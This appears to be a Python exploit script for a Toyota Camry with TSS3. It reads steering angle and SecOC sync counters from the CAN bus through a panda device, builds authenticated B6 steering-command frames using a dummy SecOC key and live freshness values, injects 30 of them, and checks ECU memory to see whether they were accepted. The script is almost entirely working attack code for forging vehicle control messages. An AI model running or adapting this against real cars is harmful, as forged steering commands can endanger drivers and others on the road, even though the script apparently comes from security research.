import time
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession, decode_secoc_sync, decode_steering_angle_deg
from opendbc.car.toyota.tss3 import *
s=MonitorSession(require_ready_parked=True)
for i,a in enumerate([0xFEBE4C00,0xFEBE4C04,0xFEBE4C08,0xFEBE5364,0xFEBE80BC,0xFEBE80B8,0xFEBE80C4,0xFEBE80C5]): s.set_watch(i,a)
s.set_running(True)
end=time.monotonic()+.4
while time.monotonic()<end: s.panda.can_recv(); time.sleep(.002)
ang=s.panda.latest(0,0x025); assert ang
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]))
tpl=TSS3B6Template(); comp=TSS3B6CompanionFields(signal264_b6_bits6_4=5,additive_term_suppress=1,contribution_pct_1=23,contribution_pct_2=47,signal273_b10_bits2_0=5)
seq=0; mc=0; cr=None; sent=[]; e0=s.panda.b6_echo_count(); g0=s.read_state()['values'][3]['raw_u32'] & 0xff
for _ in range(30):
    s.panda.can_recv(); row=s.panda.latest(0,0x00F); assert row
    sy=decode_secoc_sync(row[1]); r=int(sy['reset_counter'])
    if cr!=r: cr=r; mc=0
    app=build_b6_application(target_lateral_id=0,target_angle_raw=raw,sequence=seq,template=tpl,companions=comp)
    a,d,b=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),r,mc))
    s.panda.can_send(a,d,0,fd=True); sent.append(d); seq=(seq+1)&63; mc=(mc+1)&255
    time.sleep(.02)
time.sleep(.12)
st=s.read_state(); vals=[bytes.fromhex(v['bytes_le']) for v in st['values']]
g1=vals[3][0]
# reconstruct raw B1..B12 from 4C00/04/08
rb=vals[0]+vals[1]+vals[2]
print('sent',len(sent),'echo',s.panda.b6_echo_count()-e0,'route_delta',(g1-g0)&255)
print('last_sent_B3_B10',sent[-1][3:11].hex(),'full',sent[-1].hex())
print('raw_B1_B12',rb.hex(),'raw_B3_B10',rb[2:10].hex())
print('generated ID',vals[4][0],'angle_bytes',vals[5][:2].hex(),'pct',vals[6][0],vals[7][0])
s.set_running(False)
